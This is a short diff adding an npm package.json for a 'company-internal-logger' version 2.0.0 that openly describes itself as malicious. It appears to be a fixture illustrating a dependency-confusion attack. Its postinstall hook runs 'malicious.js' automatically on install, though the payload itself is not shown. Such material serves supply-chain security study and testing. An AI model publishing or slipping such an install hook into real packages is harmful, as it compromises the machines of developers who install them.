@@ -1,0 +1,8 @@
+{
+  "name": "company-internal-logger",
+  "version": "2.0.0",
+  "description": "A malicious version of the company-internal-logger package.",
+  "scripts": {
+    "postinstall": "node malicious.js"
+  }
+}
